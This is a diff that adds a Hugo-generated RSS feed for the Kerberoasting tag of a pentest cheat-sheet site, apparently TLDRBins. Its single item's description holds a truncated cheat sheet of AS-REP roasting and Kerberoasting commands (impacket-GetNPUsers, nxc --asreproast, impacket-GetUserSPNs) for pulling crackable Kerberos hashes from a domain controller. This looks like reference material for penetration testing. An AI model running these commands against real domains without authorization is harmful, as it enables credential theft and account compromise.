@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Kerberoasting on TLDRBins</title>
+    <link>https://tldrbins.github.io/@kerberoasting/</link>
+    <description>Recent content in Kerberoasting on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@kerberoasting/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Kerberoasting</title>
+      <link>https://tldrbins.github.io/roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/roasting/</guid>
+      <description>AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile usernames.txt -no-pass -dc-ip &amp;lt;DC&amp;gt; # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; Kerberoasting From Linux # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -no-preauth &amp;lt;USER_WITH_DONT_REQUIRE_PREAUTH&amp;gt; -usersfile usernames.</description>
+    </item>
+  </channel>
+</rss>
